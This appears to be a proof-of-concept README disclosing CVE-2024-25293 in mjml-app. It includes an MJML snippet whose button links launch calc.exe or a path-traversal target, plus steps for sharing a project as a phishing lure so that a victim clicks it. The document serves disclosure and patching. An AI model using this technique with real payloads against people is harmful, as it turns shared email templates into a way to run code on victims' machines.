# MJML Local Code Execution PoC

A Proof-Of-Concept for CVE-2024-25293 vulnerability. <br><br>
mjml-app v3.0.4 & 3.1.0-beta was discovered to contain a remote code execution (RCE)
In this repository there is an example vulnerable application and proof-of-concept (POC) exploit of it.

As a PoC there is a python file that automates the process. 
---------------------------------------

### 1.Vunerability Overview:
 * Vulnerability Subject: Local Code Execution
 * Vulnerability Version: mjml-app 3.0.4-win & mjml-app 3.1.0-beta
 * Attack Type: Remote Code Execution
 * Attack Component: In the 'mj-button' tag within the affected source code file, the 'href' attribute enables local code execution.
 * Reserved CVE Number: CVE-2024-25293

---------------------------------------

### 2. Vulnerability Cause:
*  mjml-app 3.0.4-win & mjml-app 3.1.0 beta suffers from Security Misconfiguration In the 'mj-button' tag, which can result in arbitrary code execution.
* Exploit explain
  * Running local files through event tags in mjml applications poses a security threat. In addition, the code can be executed by combining Path Traversal within the application, requiring a patch.
![image](https://github.com/EQSTLab/PoC/assets/131337101/98d338c6-812d-4329-93df-2c64bb636868)

Proof-of-concept (POC)
----------------------
**Step 1) The attacker creates an 'mj-button' with an 'href' tag and**
* **case 1) Code Execution with Path Traversal (notepad.exe)**
* **case 2) Code Execution (calc.exe)**

```html
<mjml>
  <mj-body>
    <mj-section>
      <mj-column>
        <mj-button background-color="#f45e43" color="white" href="C:\Users\EQST\Desktop\jruru\..\jruru_hacked.txt"> jruru </mj-button>
        <mj-button background-color="#f45e43" color="white" href="C:Windows/System32/calc.exe"> Code Execution </mj-button>
      </mj-column>
    </mj-section>
  </mj-body>
</mjml>
```
![mjml1](https://github.com/QnA4u/CVE/assets/131337101/862946a8-18f8-4d09-a850-6a296588780a)

**Step 2) The attacker creates the main phishing project with the following code.**
```py
<!-- header.mjml -->
<mj-section>
  <mj-column>
    <mj-text>This is a demo jruru</mj-text>
  </mj-column>
</mj-section>
<!-- main.mjml -->
<mj-include path="./index.mjml" />
```
![mjml2](https://github.com/QnA4u/CVE/assets/131337101/aaf108f9-a2d6-4e21-baf9-7f50266e5afa)

**Step 3) The victim opens the shared project and clicks the button, triggering the execution of payload(etc. calc , notepad)**
![mjml3](https://github.com/QnA4u/CVE/assets/131337101/a15a815f-94b8-4e20-b15f-a9d90c5dcdce)

---------------------------------------

### 3. Additional Information
Running exe files through href tags within an application is risky, and running files in combination with Path Traversal is a security concern. This allows phishing projects to be created and deployed to execute local files. Therefore, it is essential to modify this feature to prevent such execution.
